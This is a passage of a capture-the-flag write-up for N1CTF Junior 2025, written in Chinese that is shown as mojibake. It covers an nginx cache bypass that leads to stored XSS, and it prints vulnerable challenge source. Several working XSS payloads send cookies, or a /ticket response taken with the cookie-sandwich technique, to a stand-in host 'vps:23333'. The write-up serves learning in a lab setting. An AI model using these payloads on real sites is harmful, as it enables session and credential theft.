class="token punctuation">.</span>new_page<span class="token punctuation">(</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token string">"http://localhost/login"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='username']"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='password']"</span><span class="token punctuation">,</span> admin_password<span class="token punctuation">)</span>            page<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token string">"input[name='submit']"</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>wait_for_timeout<span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>wait_for_timeout<span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Bot error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginx.conf</p><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">user  www-data;worker_processes  auto;pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    proxy_cache_path &#x2F;var&#x2F;cache&#x2F;nginx levels&#x3D;1:2 keys_zone&#x3D;static_cache:10m max_size&#x3D;1g inactive&#x3D;60m;    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;    default_type  application&#x2F;octet-stream;    server &#123;        listen 80 default_server;        server_name _;        location &#x2F; &#123;            proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;        &#125;        location &#x2F;api&#x2F;bio&#x2F; &#123;            return 403;        &#125;        location ~ \.(css|js)$ &#123;            proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;            proxy_ignore_headers Vary;            proxy_cache static_cache;            proxy_cache_valid 200 10m;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰ 403 é™åˆ¶çš„è¯ï¼Œè®¿é—® &#x2F;api&#x2F;bio&#x2F;username ä¼šè¿”å› user.bioï¼Œbio æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¯ä»¥ xss</p><p>ä½†æ˜¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/bio/&lt;string:username>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">get_user_bio</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span>    user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> user<span class="token punctuation">.</span>bio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å‘ç°è¿œç¨‹ç¯å¢ƒçš„ key ä¹Ÿæ˜¯ <code>your-secret-key-here</code>ï¼Œé‚£ä¹ˆå¯ä»¥ç™»å½•åˆ° admin</p><p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ <code>visit_url(f&quot;http://localhost/api/bio/&#123;username&#125;&quot;)</code> ç›´æ¥èµ°çš„ nginx ä¸€å®šä¼šè¢« 403 æ‹¦ä¸‹æ¥</p><p>è§‚å¯Ÿè¿™é‡Œ</p><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">location ~ \.(css|js)$ &#123;    proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;    proxy_ignore_headers Vary;    proxy_cache static_cache;    proxy_cache_valid 200 10m;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>.css/.js</code> ç»“å°¾çš„ä¸å—é™åˆ¶èƒ½å¤Ÿæ­£å¸¸ä»£ç†åˆ° 5000 ç«¯å£ä¸Šï¼Œå¹¶ä¸”å­˜åœ¨ç¼“å­˜ï¼Œå¯ä»¥ç»•è¿‡ 403</p><p>è¿™æ ·æˆ‘ä»¬æ³¨å†Œä¸€ä¸ª 1.jsï¼Œç„¶åä¿®æ”¹ bio å°±èƒ½å®ç° xss äº†</p><h2 id="éé¢„æœŸ-1"><a href="#éé¢„æœŸ-1" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">.</span>add_cookies<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> flag_value<span class="token punctuation">,</span>    <span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    <span class="token string">'httponly'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º httpOnly æ‹¼é”™äº†å¯¼è‡´ä¸ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠ cookie x å‡ºæ¥</p><p>ä¿®æ”¹ 1.js çš„ bio ä¸º payloadï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://vps:23333/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè®¿é—® &#x2F;view è®© bot è®¿é—® &#x2F;api&#x2F;bio&#x2F;1.js å³å¯ï¼Œæ³¨æ„ç¼“å­˜æ—¶é—´ä¸º 10 åˆ†é’Ÿ</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250917145724173.png"></p><h2 id="é¢„æœŸ-1"><a href="#é¢„æœŸ-1" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>å‚è€ƒï¼š<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><p>å› ä¸ºè¿™é‡Œ ticket å¯æ§ä¸”ä¼šè¿”å›åˆ°å“åº”ä½“ cookieï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ <code>cookie sandwich technique</code>ï¼Œç»“åˆæœåŠ¡å™¨çš„å›æ˜¾ï¼Œæ”»å‡» HttpOnly çš„ cookie</p><p>expï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://localhost/ticket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>pathname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ticket="test; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>pathname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">aaa=bbb"; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=/;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/ticket"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://vps:23333/"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>                <span class="token literal-property property">body</span><span class="token operator">:</span> data<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250917150913104.png"></p><hr><h1 id="safenotesï¼ˆå¤ç°ï¼‰"><a href="#safenotesï¼ˆå¤ç°ï¼‰" class="headerlink" title="safenotesï¼ˆå¤ç°ï¼‰"></a>safenotesï¼ˆå¤ç°ï¼‰</h1><p>è¿˜åœ¨ x è¿˜åœ¨ x</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"body-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bot <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./bot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token keyword">let</span> notes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> str        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;#39;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> listItems <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">content<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;li style="margin-bottom:15px;padding:10px;border:1px solid #ddd;border-radius:5px;background:#f9f9f9;">            &lt;a href="/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a>            &lt;div id='note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' class="note-content">&lt;/div>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST" style="display:inline;">                &lt;button type="submit" style="margin-left:10px;background:#ff4d4f;color:white;border:none;border-radius:3px;cursor:pointer;">Delete&lt;/button>            &lt;/form>            &lt;script src="/preview?index=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" nonce="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/script>        &lt;/li>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;html>    &lt;head>        &lt;title>ğŸ“’ Notes&lt;/title>        &lt;style>            body &#123; font-family: Arial, sans-serif; margin: 40px; &#125;            textarea &#123; width: 400px; height: 80px; &#125;            button &#123; margin-top: 5px; &#125;            ul &#123; list-style: none; padding: 0; &#125;        &lt;/style>    &lt;/head>    &lt;body>        &lt;h1>ğŸ“’ Notes&lt;/h1>        &lt;form action="/add" method="POST">            &lt;textarea name="content">&lt;/textarea>&lt;br>            &lt;button type="submit">Add Note&lt;/button>        &lt;/form>        &lt;hr>        &lt;ul>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>listItems<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/ul>    &lt;/body>    &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/preview"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> index <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>index<span class="token punctuation">;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>    content<span class="token operator">=</span><span class="token function">escapeHTML</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> js <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    (function()&#123;        const el = document.getElementById('note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">');        if (!el) return;        const text = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        if (text.length > 50) &#123;            el.innerHTML = text.slice(0,50) + '...';        &#125; else &#123;            el.innerHTML = text;        &#125;    &#125;)();    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/add"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>content<span class="token punctuation">)</span> notes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/note/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> id <span class="token operator">&lt;</span> notes<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">            &lt;h1>Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>            &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>            &lt;a href="/">Back&lt;/a>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST">                &lt;button type="submit">Delete this note&lt;/button>            &lt;/form>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Note not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/delete/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> id <span class="token operator">&lt;</span> notes<span class="token punctuation">.</span>length<span class="token punctuation">)</span> notes<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token 